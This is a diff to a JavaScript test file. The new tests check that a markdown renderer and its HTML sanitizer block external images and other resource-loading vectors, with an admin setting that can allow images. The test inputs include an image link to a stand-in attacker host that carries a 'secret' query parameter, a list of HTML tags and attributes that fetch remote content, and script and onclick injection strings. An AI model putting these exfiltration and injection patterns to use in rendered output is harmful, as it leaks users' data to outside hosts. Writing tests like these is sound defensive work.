@@ -99,6 +99,71 @@ test('wrapScrollableTables', () => {
   expect(app.wrapScrollableTables(wrapped)).toBe(wrapped);
 });
 
+test('formatMarkdown does not load external resources', () => {
+  const html = app.formatMarkdown('![x](https://evil.example/leak?d=secret) [link](https://evil.example/page)');
+  const root = document.createElement('div');
+  root.innerHTML = html;
+
+  expect(root.querySelector('img')).toBeNull();
+  const links = root.querySelectorAll('a');
+  expect(links[0].getAttribute('href')).toBe('https://evil.example/leak?d=secret');
+  expect(links[0].textContent).toBe('External image not loaded: https://evil.example/leak?d=secret');
+  expect(links[1].getAttribute('rel')).toBe('noopener noreferrer');
+  expect(links[1].getAttribute('target')).toBe('_blank');
+
+  expect(app.formatMarkdown('![x](https://evil.example/a)', true)).not.toContain('<img');
+});
+
+test('formatMarkdown loads external images only in authored text the admin allows', () => {
+  const markdown = '![x](https://intranet.example/a.png)';
+  const params = app.parameters;
+  try {
+    app.parameters = { allowExternalMarkdownImages: false };
+    expect(app.formatMarkdown(markdown, false, true)).not.toContain('<img');
+
+    app.parameters = { allowExternalMarkdownImages: true };
+    expect(app.formatMarkdown(markdown, false, true)).toContain('<img src="https://intranet.example/a.png"');
+    expect(app.formatMarkdown(markdown, true, true)).toContain('<img src="https://intranet.example/a.png"');
+    expect(app.formatMarkdown(markdown)).not.toContain('<img');
+    expect(app.formatMarkdownMermaid(markdown)).not.toContain('<img');
+  } finally {
+    app.parameters = params;
+  }
+});
+
+test('sanitizeMarkdownHtml', () => {
+  expect(app.sanitizeMarkdownHtml('')).toBe('');
+  expect(app.sanitizeMarkdownHtml(null)).toBe('');
+
+  const blocked = [
+    '<img srcset="https://evil.example/a 1x">',
+    '<div style="background:url(https://evil.example/b)">x</div>',
+    '<video poster="https://evil.example/c" src="https://evil.example/d"></video>',
+    '<audio src="https://evil.example/e"></audio>',
+    '<picture><source srcset="https://evil.example/f"></picture>',
+    '<input type="image" src="https://evil.example/g">',
+    '<table background="https://evil.example/h"><tbody><tr><td>x</td></tr></tbody></table>',
+    '<svg><image href="https://evil.example/i"></image></svg>',
+    '<a href="/x" ping="https://evil.example/j">x</a>',
+    '<img src="https://evil.example:bad">',
+  ];
+  blocked.forEach(html => {
+    const root = document.createElement('div');
+    root.innerHTML = app.sanitizeMarkdownHtml(html);
+    expect(root.querySelector('img[src], video, audio, source, input, svg, [style], [srcset], [background], [poster], [ping]')).toBeNull();
+  });
+
+  const kept = [
+    '<img src="images/logo.svg">',
+    '<img src="data:image/png;base64,AAAA">',
+    '<pre class="mermaid">graph TD\nA</pre>',
+    '<table><thead><tr><th align="center">h</th></tr></thead></table>',
+  ];
+  kept.forEach(html => expect(app.sanitizeMarkdownHtml(html)).toBe(html));
+
+  expect(app.sanitizeMarkdownHtml('<a href="/x">x</a>')).toBe('<a href="/x">x</a>');
+});
+
 test('formatMarkdownSanitizesTables', () => {
   // Wrapping happens after sanitization, so unsafe markup around a table is still stripped.
   const html = app.formatMarkdown('| a |\n| --- |\n| 1 |\n\n<p onclick="evil()">x</p><script>evil()</script>');
@@ -1454,14 +1519,14 @@ test('formatMarkdownMermaid', () => {
   const renderMermaid = jest.spyOn(app, 'renderMermaid').mockImplementation(() => {});
 
   expect(app.formatMarkdownMermaid('```mermaid\nA[Start: Begin]\n```')).toBe('<p>```mermaid\nA[Start∶ Begin]\n```</p>');
-  expect(formatMarkdown).toHaveBeenCalledWith('```mermaid\nA[Start∶ Begin]\n```', true);
+  expect(formatMarkdown).toHaveBeenCalledWith('```mermaid\nA[Start∶ Begin]\n```', true, false);
   expect(renderMermaid).toHaveBeenCalledTimes(1);
 
   app.formatMarkdownMermaid('streaming', false);
   expect(renderMermaid).toHaveBeenCalledTimes(1);
 
-  app.formatMarkdownMermaid('```mermaid\nAlice->>Bob: Hello\n```', true, false);
-  expect(formatMarkdown).toHaveBeenLastCalledWith('```mermaid\nAlice->>Bob: Hello\n```', true);
+  app.formatMarkdownMermaid('```mermaid\nAlice->>Bob: Hello\n```', true, true);
+  expect(formatMarkdown).toHaveBeenLastCalledWith('```mermaid\nAlice->>Bob: Hello\n```', true, true);
 
   expect(app.formatMarkdownMermaid('')).toBe('');
   expect(app.formatMarkdownMermaid(null)).toBe('');
